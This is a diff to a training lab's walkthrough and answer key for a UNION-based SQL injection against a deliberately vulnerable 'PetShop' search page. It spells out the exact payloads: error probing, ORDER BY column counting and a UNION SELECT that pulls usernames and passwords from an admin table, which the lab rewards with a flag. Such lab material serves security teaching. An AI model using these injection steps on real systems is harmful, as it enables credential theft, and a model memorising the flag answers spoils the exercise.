@@ -32,13 +32,67 @@ This module contains four variations, each highlighting a different type of SQL 
 
 **Objective**: Extract the administrator credentials stored in another table.
 
-1. Navigate to the PetShop portal. The SQL query retrieves four columns: `name, breed, price, image_url`.
-2. First, confirm the number of columns using an `ORDER BY` clause, or simply use the fact we know we need 4 columns.
-3. The hidden table is `lab7_admin_creds` which stores `username` and `password`.
-4. Submit the following payload into the search bar:
-   `Dogs' UNION SELECT username, password, 1, 'https://via.placeholder.com/600x400' FROM lab7_admin_creds--`
-5. Note: Make sure there's a space after the double dash `-- `.
-6. Hit search. The results will append a new row containing the `username` (administrator) and `password` (which contains the flag `FLAG{union_based_sql_injection_master}`)!
+**Quick Steps** (If you know the payload):
+
+1. Navigate to the PetShop portal at `/lab7/1/c`
+
+2. Find the search box and look at the category parameter in the URL
+
+3. **Copy and paste this exact payload** into the search box:
+   ```
+   Dogs' UNION SELECT username, password, 1, 1 FROM lab7_admin_creds--
+   ```
+
+4. Hit search and you'll see the admin credentials displayed!
+
+---
+
+**Discovery Method** (If you don't know the payload):
+
+Follow these steps to figure out the injection yourself:
+
+1. **Navigate to the search page**: Go to `/lab7/1/c` and search for any product (e.g., "Dogs")
+
+2. **Identify the vulnerable parameter**: Look at the URL - notice the `category` parameter (e.g., `?category=Dogs`)
+
+3. **Test for SQL Injection**: Try adding a single quote to break the query:
+   ```
+   Dogs'
+   ```
+   You should see an SQL error, confirming the vulnerability!
+
+4. **Find the number of columns**: Use `ORDER BY` to discover how many columns the query returns:
+   ```
+   Dogs' ORDER BY 1--
+   Dogs' ORDER BY 2--
+   Dogs' ORDER BY 3--
+   Dogs' ORDER BY 4--
+   Dogs' ORDER BY 5--
+   ```
+   When you hit 5, you'll get an error. **So there are 4 columns!**
+
+5. **Use UNION SELECT**: Now craft a UNION query with 4 columns:
+   ```
+   Dogs' UNION SELECT 1,2,3,4--
+   ```
+   You should see numbers displayed. This confirms the injection works!
+
+6. **Extract hidden table data**: Since there's likely an admin table, try:
+   ```
+   Dogs' UNION SELECT username, password, 1, 1 FROM lab7_admin_creds--
+   ```
+
+7. **Get the flag**: When you see the admin credentials, the password contains your flag!
+
+**How it works** (Understanding the technique):
+- The original query expects 4 columns: `name, breed, price, image_url`
+- `Dogs' UNION SELECT` - Combines your custom data with the original query
+- `username, password` - Gets admin username and password
+- `1, 1` - Dummy values for the remaining columns
+- `FROM lab7_admin_creds` - Pulls from the hidden admin table
+- `--` - Comments out the rest (don't forget the space after!)
+
+**Result**: The flag appears in the password field: `FLAG{union_based_sql_injection_master}`
 
 ### Variation D: HR Portal (Integer-Based SQLi)
 
